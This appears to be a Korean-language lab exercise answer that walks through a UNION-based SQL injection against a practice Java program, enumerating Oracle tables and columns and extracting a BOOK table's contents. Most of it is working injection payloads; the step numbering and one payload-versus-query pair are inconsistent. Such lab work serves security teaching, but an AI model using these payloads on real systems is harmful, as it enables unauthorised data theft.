### Q.데이터 탈취 연습

- StudentInjectMain.java를 공격하여 BOOK Table의 데이터를 탈취하는 작업 진행하기

### A. 진행과정 및 설명

#### 1. 우선 SQL 인젝션 공격 시도 가능성 및 출력을 확인한다.

```bash
# 테이블의 형태와 데이터를 확인하기
Enter the StudentNo: ' OR 1=1--'
# 실행되는 SQL: SELECT * FROM STUDENT WHERE STD_NO='' OR 1=1 --''
```

#### 4. STUDENT 테이블 구조 조회

- STUDENT 테이블의 구조를 조회하여 어떤 데이터 타입을 가지는 지 확인

```bash
# BOOK 데이터 탈취
Enter the StudentNo: ' OR 1=1 UNION SELECT COLUMN_NAME, DATA_TYPE, NULL, NULL, NULL, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'STUDENT'--'
# 실행되는 SQL: SELECT * FROM STUDENT WHERE STD_NO='' OR 1=1 UNION SELECT TABLE_NAME, COLUMN_NAME, NULL, DATA_TYPE, NULL, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'STUDENT'--''
```

이를 이용하면, Column 명과 Data Type을 조회할 수 있으므로, 향후 공격 시 활용

#### 3. TABLE 찾기

- TABLE의 COLUMN은 6개임.
- TABLE의 정보는 `USER_TABLES`로부터 가져올 수 있음

이를 활용하여 Injection 공격을 하면 다음과 같이 적을 수 있다.

```bash
# 어떤 테이블이 있는지 조회하기
Enter the StudentNo: ' OR 1=1 UNION SELECT TABLE_NAME, NULL, NULL, NULL, NULL, NULL FROM USER_TABLES--'
# 실행되는 SQL: SELECT * FROM STUDENT WHERE STD_NO='' OR 1=1 UNION SELECT TABLE_NAME, NULL, NULL, NULL, NULL, NULL FROM USER_TABLES--''
```

#### 4. BOOK 테이블 구조 조회

- BOOK TABLE이 있음을 확인했으므로, 어떤 Column이 있는지 체크

```bash
# BOOK 데이터 탈취
Enter the StudentNo: 'OR 1=1 UNION SELECT COLUMN_NAME, DATA_TYPE, NULL, NULL, NULL, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='BOOK' --'
# 실행되는 SQL: SELECT * FROM STUDENT WHERE STD_NO=''OR 1=1 UNION SELECT COLUMN_NAME, DATA_TYPE, NULL, NULL, NULL, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='BOOK' --''
```

#### 5. BOOK 테이블 데이터 탈취

- Injection을 통해 Book table 의 컬럼을 확인했으므로, 필요한 컬럼을 최대 6개씩 지정하여 데이터를 탈취

```bash
# BOOK 데이터 탈취
Enter the StudentNo: ' OR 1=1 UNION SELECT BOOK_NO, BOOK_NAME, BOOK_PRICE, BOOK_AUTHOR, BOOK_DATE, PUB_NO FROM BOOK--'
# 실행되는 SQL: SELECT * FROM STUDENT WHERE STD_NO='' OR 1=1 UNION SELECT BOOK_NO, BOOK_NAME, BOOK_PRICE, BOOK_AUTHOR, BOOK_DATE, PUB_NO FROM BOOK--''
# BOOK_AUTHOR는 데이터 타입 때문에 조회를 못했으므로 따로 조회
Enter the StudentNo: ' OR 1=1 UNION SELECT BOOK_NO, BOOK_AUTHOR, NULL, NULL, NULL, NULL FROM BOOK--'
# 실행되는 SQL: SELECT * FROM STUDENT WHERE STD_NO='' OR 1=1 UNION SELECT BOOK_NO, BOOK_AUTHOR, NULL, NULL, NULL, NULL FROM BOOK--''
```

이러한 과정을 통해 BOOK TABLE의 존재 여부, 구조, 데이터를 모두 탈취할 수 있었음
